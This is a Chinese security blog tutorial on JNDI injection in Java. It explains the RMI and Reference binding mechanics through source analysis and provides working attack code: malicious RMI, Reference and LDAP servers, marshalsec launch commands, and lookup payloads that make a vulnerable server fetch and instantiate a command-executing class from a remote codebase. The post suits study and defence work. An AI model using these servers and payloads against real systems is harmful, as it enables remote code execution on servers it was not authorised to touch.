---
title: "JNDI注入(InitialContext.lookup)"
onlyTitle: true
date: 2024-9-25 18:30:58
categories:
- java
- RMI
tags:
- JNDI
- java原生RCE
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8100.png
---



JNDI是一种命名服务，全称叫Java Naming and Directory Interface

开发者可以讲JNDI API映射为特定的命名服务和目录系统。

单纯的文字讲着可能很抽象，来看case

RMI中，提供一个远程对象，并在客户端调用远程对象的方法，代码如下：

## JNDI绑定RMI

### RMIServer

* 一个公用的继承Remote的接口RemoteInterface

```java
public interface RemoteInterface extends Remote {
    public String sayHello(String name) throws RemoteException;
}
```

* 一个远程对象RemoteImpl

```java
public class RemoteImpl extends UnicastRemoteObject implements RemoteInterface {
    protected RemoteImpl() throws RemoteException {
    }

    public String sayHello(String name) {
        System.out.println("Hello " + name);
        return "Hello " + name;
    }
}
```

* RMIServer，在里面新建了注册中心并绑定远程对象

```java
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
        RemoteInterface remoteImpl = new RemoteImpl();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("remoteImpl", remoteImpl);
    }
}
```

### RMIClient

* 同上，公用的继承Remote的接口RemoteInterface

```java
public interface RemoteInterface extends Remote {
    public String sayHello(String name) throws RemoteException;
}
```

* RMIClient，获取注册中心，获取远程对象，并执行方法

```java
public class RMIClient {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        RemoteInterface remoteImpl = (RemoteInterface) registry.lookup("remoteImpl");
        System.out.println(remoteImpl.sayHello("RMI"));
    }
}
```



而以上代码可以改成JNDI封装的形式，实现同样的功能

### JNDIServer（RMI）

RemoteInterface、RemoteImpl、RMIServer的三个代码都不变，加一个JNDIServer进行封装

* JNDIServer。创建一个初始上下文，rebind重新绑定远程对象

```java
public class JNDIServer {
    public static void main(String[] args) throws Exception {
        InitialContext context = new InitialContext();
        context.rebind("rmi://localhost:1099/remoteImpl", new RemoteImpl());
    }
}
```

先开RMIServer，再开JNDIServer

### JNDIClient（RMI）

不再需要RMIClient，换成JNDIClient来调用

* JNDIClient

```java
public class JDNIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("rmi://127.0.0.1:1099/remoteImpl");
        remoteObject.sayHello("JNDI");
    }
}
```

实现和RMIServer,RMIClient一样的效果

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925143636081.png)

###  源码分析

JNDI绑定RMI，实际上只是做了个封装，还是通过RMI来实现的。也就是说对RMI的攻击同样对JNDI绑定RMI的环境奏效

JNDIServer打个断点

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144618924.png)

跟着你就发现，来到了RegistryImpl_Stub.rebind()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144730278.png)

同理，在RMIClient打个断点

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144820417.png)

来到了RegistryImpl_Stub.lookup()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144906185.png)

完美符合RMI步骤

RMI能打的都能打，只要在版本内

### 恶意RMI Server

JDK<=8u121

但这里还有个问题，假如说服务器有代码长JNDIClient这样，调用远程对象的方法，再假如lookup的参数我们可以控制

```java
    InitialContext initialContext = new InitialContext();
    RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("rmi://127.0.0.1:1099/remoteImpl");
    remoteObject.sayHello("JNDI");
```

是不是我们就能起一个恶意Server，让这个lookup加载我们的恶意远程类。No，因为RMI需要客户端和服务端拥有同一远程接口。比如这个case，我们开盲盒没办法知道RemoteInterface的代码。当然如果你知道的话，就能这么打

攻击机：

需要有RMIServer、和服务器相同的RemoteInterface接口。

另外多出一个恶意对象和恶意JNDI服务

```java
public class RuntimeEvil extends UnicastRemoteObject implements RemoteInterface{
    public RuntimeEvil() throws RemoteException {}

    @Override
    public String sayHello(String name) throws RemoteException {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return "Hello " + name;
    }
}
```

```java
public class EvilJNDIServer {
    public static void main(String[] args) throws Exception {
        InitialContext context = new InitialContext();
        context.rebind("rmi://vpsip:port/remoteImpl", new RuntimeEvil());
    }
}
```

服务器：

控制lookup参数为`rmi://vpsip:port/remoteImpl`，必须要调用sayHello才能命令执行

而RMI就不能这么打，因为RMI中我们不能控制URL，需要多一个获取注册中心的部分，但是当然可以JRMP打



## JNDI绑定Reference

服务端同样需要RemoteInterface、RemoteImpl、RMIServer

JNDIServer换个方式绑定罢了，看到上面加载RuntimeEvil的例子了吗，需要知道服务器RemoteInterface的代码，并继承UnicastRemoteObject。而经过Reference封装就不用

### 恶意 Reference Server

RuntimeEvil.class

我们的类在实例化后不能转化为ObjectFactory`(ObjectFactory) clas.newInstance()`。让我们的类继承ObjectFactory即可。

```java
public class RuntimeEvil implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }

    public RuntimeEvil() throws RemoteException {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

需要在RuntimeEvil.class所在路径开一个http服务 

`python -m http.server 8888`

```java
public class JNDIReferenceServer {
    public static void main(String[] args) throws Exception {
        InitialContext context = new InitialContext();
        Reference reference = new Reference("RuntimeEvil", "RuntimeEvil", "http://localhost:8888/");
        context.rebind("rmi://localhost:1099/remoteImpl", reference);
    }
}
```

JNDIClient执行lookup就能弹计算器

![自写RMIServer JNDI注入](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/%E8%87%AA%E5%86%99RMIServer%20JNDI%E6%B3%A8%E5%85%A5.gif)

> 新RuntimeEvil.class为什么Reference版的执行命令是写在构造函数，而RMI版命令执行代码是写在实现方法sayHello里面呢？

来看代码：

### 源码分析

在JNDIReferenceServer的rebind方法打上断点：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163542911.png)

跟进去发现，在RegistryContext.rebind内，调用RegistryImpl_Stub.rebind进行绑定的对象，是用encodeObject封装过的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163649452.png)

跟进encodeObject，看到，如果绑定的类是Reference类型，则会用RefrenceWrapper封装

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163852311.png)

OK，恢复程序，再到客户端lookup打上断点

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164116719.png)

跟到RegistryContext.lookup内，调用RegistryImpl_Stub.lookup后，调用decodeObject解封装

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164243051.png)

如果需要查询的对象是RemoteReference类型，则用调用getRefrence()获取，紧跟着调用NameManger.getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164450260.png)

执行完getReference后，已经变成了我们Server新建的Reference对象。那NameManger.getObjectInstance一定是解析Reference了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164725973.png)

没错，NameManger.getObjectInstance内调用了getObjectFactoryFromRefrence和factory.getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164948551.png)

getObjectFactoryFromReference内，先调了个helper.loadClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165215328.png)

跟进去发现就是用AppClassLoader来加载类，也就是在本地Path找找有没有这个远程类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165338524.png)

loadClass后，紧接着就是从codebase加载类，这里codebase就是我们提供的http路径

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165536631.png)

最后newInstance创建实例并返回

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165553736.png)



So，RMI只是返回了创建好的实例。如果JNDI绑定的是Reference，则会传递RefrenceWrapper封装的类，在客户端上解封装并从factoryLocation加载类并实例化。

如果不是Reference，当然不会在客户端实例化，也就不会调用构造函数

上述JNDI+RMI可以用marshalsec来起，注意marshalsec需要保证本机为JDK8

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/#RuntimeEvil 1099
```

默认RMI为1099

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925174614914.png)

lookup payload：

```java
rmi://127.0.0.1:1099/#RuntimeEvil
```

![marshalsec JNDI注入](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/marshalsec%20JNDI%E6%B3%A8%E5%85%A5.gif)







## JNDI other

JNDI支持四种协议，如下表。

| 协议  | 作用                                                         |
| ----- | ------------------------------------------------------------ |
| LDAP  | 轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容 |
| RMI   | JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象 |
| DNS   | 域名服务                                                     |
| CORBA | 公共对象请求代理体系结构                                     |

其中LDAP,RMI,CORBA都支持加载远程对象并实例化

根据不同的协议，这里获取到的Context不同

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171820187.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171844532.png)

比如RMI是获取到RegistryContext.class

* 8u121修复

jdni在8u121后，在加载factoryLocation时，对远程codebase不再信赖，默认trustURLCodebase为false。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png)不过只加了RMI和CORBA的，LDAP依旧能打，详情自己去LDAPctx文件跟

如果你要用ldap服务打，相应的就要改RMIServer为LDAPServer：

直接抄一个，因为LDAP服务不是java特有的，其他语言也在用的一个轻型目录访问协议（Lightweight Directory Access Protocol），图方便可以用marshalsec起

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#RuntimeEvil 1099
```

也可以用java起，代码比较麻烦

依赖：

```xml
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>3.1.1</version>
</dependency>
```

```java
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LdapAtkServer {

    private static final String LDAP_BASE = "dc=t4rrega,dc=domain";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8888/#RuntimeEvil"};
        int port = 1099;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

记得要改协议，lookup payload：

```JAVA
ldap://127.0.0.1:1099/#JNDI_RuntimeEvil
```

* 修复

8u191 `com.sun.jndi.ldap.object.trustURLCodebase `属性的默认值被调整为false，LDAP也打不了了



总之有JNDI，建议直接LDAP打，除非服务器禁了LDAP协议
